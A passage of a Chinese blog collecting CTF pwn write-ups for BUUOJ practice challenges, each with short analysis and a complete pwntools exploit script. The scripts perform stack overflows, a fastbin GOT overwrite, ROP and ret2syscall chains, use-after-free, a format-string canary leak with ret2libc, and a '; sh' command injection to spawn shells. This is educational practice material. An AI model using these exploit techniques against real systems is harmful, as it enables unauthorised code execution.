+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593390636362-d967aea7-2270-4769-8957-29e79552fe3d.png#align=left&display=inline&height=237&margin=%5Bobject%20Object%5D&name=image.png&originHeight=384&originWidth=784&size=50050&status=done&style=none&width=483" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./memory')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28186</span>)</span><br><span class="line">sys_addr=<span class="number">0x080485BD</span></span><br><span class="line">flag_addr=<span class="number">0x80487E0</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x17</span>+p32(sys_addr)+p32(sys_addr)+p32(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h1><p>逆向不出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28035</span>)</span><br><span class="line">shell = <span class="number">0x400e88</span></span><br><span class="line">io.sendlineafter(<span class="string">': '</span>,<span class="string">'admin'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">': '</span>,<span class="string">'2jctf_pa5sw0rd'</span>+<span class="string">'\x00'</span>*<span class="number">58</span>+p64(shell))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h1><p>创建完成之后编辑的时候输入的 size 没有做检查</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593585643309-8443b2ff-b26c-46b2-8a2a-e06fef160d72.png#align=left&display=inline&height=503&margin=%5Bobject%20Object%5D&name=image.png&originHeight=623&originWidth=399&size=35070&status=done&style=none&width=322" alt="image.png"></p>
+<p>首先申请 3 个 chunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x58</span>,<span class="string">'aaaa'</span>) <span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'bbbb'</span>) <span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'cccc'</span>) <span class="comment">#2</span></span><br></pre></td></tr></table></figure>
+
+<p>然后 drop 掉第 2 个，然后通过编辑第一个把本来的第 2 个的 fd 指针覆盖为 0x6020ad，这是 0x6020b0-3 得到的，0x6020b0 是 heaparray 数组</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593611332624-ab96bca8-0b6f-4ca1-aa3d-6f6edd7e4f16.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&name=image.png&originHeight=564&originWidth=790&size=88324&status=done&style=none&width=471" alt="image.png"></p>
+<p>希望通过错位来有一个 0x7f 的 size</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593611531415-56af6659-d3b2-46d8-af4c-394928dcd3e0.png#align=left&display=inline&height=156&margin=%5Bobject%20Object%5D&name=image.png&originHeight=224&originWidth=677&size=39425&status=done&style=none&width=471" alt="image.png"></p>
+<p>下面，先加上 3 把错位对齐，然后四个 p64(0) 是为了占位，再写 p64(elf.got[‘free’]) 就是 heaparray 数组了<br>把他给覆盖掉，现在 heaparray 指向的是 free 的 got 表了（本来指向第 0 个 chunk 的地址），这时候修改第 0 个，就能改掉 free 的 got 表</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593612410034-9d6a574d-7566-4137-8d72-900cf166b1fd.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&name=image.png&originHeight=552&originWidth=688&size=93355&status=done&style=none&width=344" alt="image.png"></p>
+<p>改掉！改成 system</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593613264587-9fd2065a-de6b-4c23-892a-5425b4223d1d.png#align=left&display=inline&height=125&margin=%5Bobject%20Object%5D&name=image.png&originHeight=249&originWidth=1090&size=115126&status=done&style=none&width=545" alt="image.png"></p>
+<p>然后再 free 1 就好了（之前把 1 上写上 /bin/sh 了）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment">#p=process('./easyheap')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28007</span>)</span><br><span class="line">elf=ELF(<span class="string">'./easyheap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice :'</span>,str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Heap : "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"heap:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"Heap : "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"heap : "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">drop</span><span class="params">(index)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"aaaa"</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"bbbb"</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"cccc"</span>) <span class="comment"># 2</span></span><br><span class="line">drop(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span>*<span class="number">0x60</span> + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020b0</span><span class="number">-3</span>)</span><br><span class="line">edit(<span class="number">1</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"cccc"</span>) <span class="comment"># 2</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(elf.got[<span class="string">'free'</span>])</span><br><span class="line">add(<span class="number">0x68</span>,payload)</span><br><span class="line">payload = p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> hex(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">drop(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h1><p>32 位程序，栈空间 32，开启了栈不可执行，没有可以利用的后门，尝试 ret2syscall</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594377171288-69e1bd25-ff52-4962-afa0-116b60760c30.png#align=left&display=inline&height=362&margin=%5Bobject%20Object%5D&name=image.png&originHeight=575&originWidth=734&size=121577&status=done&style=none&width=462" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594377235122-07931066-e4b2-4979-a354-17373ae6f044.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=689&size=30119&status=done&style=none&width=517" alt="image.png"></p>
+<p>那么问题来了 /bin/sh 的地址在哪里？，bss 段是可读可写的，那就用 read 函数写到里面去</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594377580624-ad94ffe6-5850-460c-8bbd-c450ff7a2b16.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&name=image.png&originHeight=363&originWidth=338&size=21772&status=done&style=none&width=289" alt="image.png"></p>
+<p>exp：<br>ret2shellcode（修改 mprotect）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./simplerop'</span>)</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',25858)</span></span><br><span class="line">elf = ELF(<span class="string">'./simplerop'</span>)</span><br><span class="line">bss = elf.bss()</span><br><span class="line">mprotect_addr = elf.sym[<span class="string">'mprotect'</span>]</span><br><span class="line">read_addr = elf.sym[<span class="string">'read'</span>]</span><br><span class="line">pop3 = <span class="number">0x08048913</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">32</span>+p32(mprotect_addr)+p32(pop3)+p32(<span class="number">0x80ea000</span>)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line">payload += p32(read_addr)+p32(pop3)+p32(<span class="number">0</span>)+p32(bss+<span class="number">0x50</span>)+p32(<span class="number">0x50</span>)+p32(bss+<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>ret2syscall</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./simplerop'</span>)</span><br><span class="line">int_80 = <span class="number">0x80493e1</span></span><br><span class="line">pop_eax = <span class="number">0x80bae06</span></span><br><span class="line">read_addr = <span class="number">0x0806CD50</span></span><br><span class="line">binsh_addr = <span class="number">0x080EB584</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(binsh_addr) + p32(<span class="number">0x8</span>) + p32(pop_eax) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(binsh_addr) + p32(int_80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h1><p>可以看一下大致的结构，首先一个 0xc 大小的用来存放 print 函数、free 函数的地址，然后还有存放这个 index 执行的 chunk 的地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594627782384-6dc29dde-7c7e-45d3-b78d-09c4a108aa0a.png#align=left&display=inline&height=278&margin=%5Bobject%20Object%5D&name=image.png&originHeight=361&originWidth=730&size=76557&status=done&style=none&width=563" alt="image.png"></p>
+<p>free 的时候没有进行置零，所以存在 uaf</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594628058925-9b0daced-d544-4937-8e6c-03d1963b421c.png#align=left&display=inline&height=110&margin=%5Bobject%20Object%5D&name=image.png&originHeight=119&originWidth=348&size=7561&status=done&style=none&width=322" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p=process(<span class="string">'./ciscn'</span> )</span><br><span class="line">elf=ELF(<span class="string">'./ciscn'</span> )</span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,len,content)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'CNote &gt; '</span>,str(<span class="number">1</span>))</span><br><span class="line">  p.sendlineafter(<span class="string">'Index &gt; '</span>,str(index))</span><br><span class="line">  p.sendlineafter(<span class="string">'Type &gt; '</span>,str(<span class="number">2</span>))</span><br><span class="line">  p.sendlineafter(<span class="string">'Length &gt; '</span>,str(len))</span><br><span class="line">  p.sendlineafter(<span class="string">'Value &gt; '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'CNote &gt; '</span>,str(<span class="number">2</span>))</span><br><span class="line">  p.sendlineafter(<span class="string">'Index &gt; '</span>,str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">'yichen'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">'writeup'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#释放掉之后有两个空闲的0xc大小的chunk</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xc</span>,<span class="string">'sh\x00\x00'</span>+p32(elf.sym[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#去申请0xc大小的chunk首先会申请到第1个的0xc就是数组records[v2],然后是第0个的0xc用来存放内容</span></span><br><span class="line"><span class="comment">#那我们就可以修改第0个,把print的地址改成sh,把free的地址改成system的地址</span></span><br><span class="line"><span class="comment">#从那个伪代码可以看到free(ptr+2),即print的位置</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h1><p>通过格式化字符串泄漏 canary，然后 rop（还是第一次做这样的）</p>
+<p>通过 AA%n$p 来测试出我们的 格式化字符串是在哪个位置<br>AA%6$p 的时候输出了 4141，所以第六个参数可以被解析成格式化字符串</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594689172976-c99723ce-5d6c-4ca5-96d6-80c69ff9ba36.png#align=left&display=inline&height=100&margin=%5Bobject%20Object%5D&name=image.png&originHeight=131&originWidth=412&size=17910&status=done&style=none&width=315" alt="image.png"></p>
+<p>canary 的位置是 rbp-8</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594689636942-4315ceb6-663a-4fca-908d-afc1646dec44.png#align=left&display=inline&height=540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1080&originWidth=1634&size=224522&status=done&style=none&width=817" alt="image.png"></p>
+<p>在 gdb 里面调试看看（%7$p 就能把 canary 给打印出来）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594689708633-3b11dd87-7a35-48b0-a050-307186cc2437.png#align=left&display=inline&height=484&margin=%5Bobject%20Object%5D&name=image.png&originHeight=719&originWidth=827&size=169906&status=done&style=none&width=557" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594689781595-afa1cfb4-4be1-4991-886c-ca82b414c978.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&name=image.png&originHeight=134&originWidth=409&size=17882&status=done&style=none&width=409" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./babyrop2')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29772</span>)</span><br><span class="line">elf=ELF(<span class="string">'./babyrop2'</span>)</span><br><span class="line">put_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">put_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi=<span class="number">0x0400993</span></span><br><span class="line">main_addr=elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">vuln_addr=<span class="number">0x400887</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'help u!\n'</span>,<span class="string">'%7$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(canary)</span><br><span class="line">payload = payload.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>)+<span class="string">'a'</span>*<span class="number">8</span>+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(vuln_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'story!\n'</span>,payload)</span><br><span class="line">put_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">'puts'</span>,put_addr)</span><br><span class="line">libcbase=put_addr-libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(canary)</span><br><span class="line">payload = payload.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>)+<span class="string">'a'</span>*<span class="number">8</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)+p64(vuln_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'story!\n'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h1><p>emmmm，命令执行，一个 system 函数，直接写上 <code>; sh</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594773840328-d015088d-fa8a-4c9a-b464-3a6f10b61315.png#align=left&display=inline&height=341&margin=%5Bobject%20Object%5D&name=image.png&originHeight=481&originWidth=543&size=30827&status=done&style=none&width=385" alt="image.png"></p>
+<h1 id="V-amp-N2020-公开赛-easyTHeap"><a href="#V-amp-N2020-公开赛-easyTHeap" class="headerlink" title="[V&amp;N2020 公开赛]easyTHeap"></a>[V&amp;N2020 公开赛]easyTHeap</h1><p>实现的功能</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594800244904-badcef54-d3e1-4d5b-beb6-7211fa57b259.png#align=left&display=inline&height=176&margin=%5Bobject%20Object%5D&name=image.png&originHeight=180&originWidth=293&size=9501&status=done&style=none&width=287" alt="image.png"></p>
+<p>add 的时候对于 size 的要求是大于 0 小于 256 也就是 0x100</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594802083336-088a0268-1f0f-409e-8693-7ed9c05d4919.png#align=left&display=inline&height=342&margin=%5Bobject%20Object%5D&name=image.png&originHeight=500&originWidth=376&size=28246&status=done&style=none&width=257" alt="image.png"></p>
+<p>只能创建 7 个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594802195645-f844a94d-130a-449f-9bc7-68775d377649.png#align=left&display=inline&height=193&margin=%5Bobject%20Object%5D&name=image.png&originHeight=240&originWidth=639&size=18299&status=done&style=none&width=513" alt="image.png"></p>
+<p>delete 的时候，后面那个置零操作并没有把申请的那个给置零，而是把 size 给置零了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594802285718-c315fc0e-781b-46e4-af72-7b598df316e0.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&name=image.png&originHeight=244&originWidth=444&size=15740&status=done&style=none&width=436" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/06/25/owh91m/" data-id="ckco0htxy000lh4u97d6165g1" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/06/26/uae87q/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            PWN入门（unsafe unlink）
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/06/23/ygucy4/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">深思杯-PWN</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
